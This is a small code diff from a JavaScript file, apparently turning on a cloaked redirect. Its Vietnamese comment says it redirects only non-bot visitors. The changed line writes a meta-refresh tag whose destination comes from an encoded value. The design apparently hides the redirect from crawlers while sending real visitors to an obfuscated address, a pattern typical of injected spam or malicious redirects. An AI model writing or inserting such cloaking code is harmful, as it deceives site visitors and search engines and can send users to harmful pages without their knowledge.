@@ -44,7 +44,7 @@
         }
 
         // Khi ON: Chỉ chuyển hướng nếu không phải bot
-        if (redirectStatus === 'OFF' && data && !isBot()) {
+        if (redirectStatus === 'ON' && data && !isBot()) {
             const destination = decodeAdvanced(data);
             document.write(`<meta http-equiv="refresh" content="0;url=${destination}">`);
         }
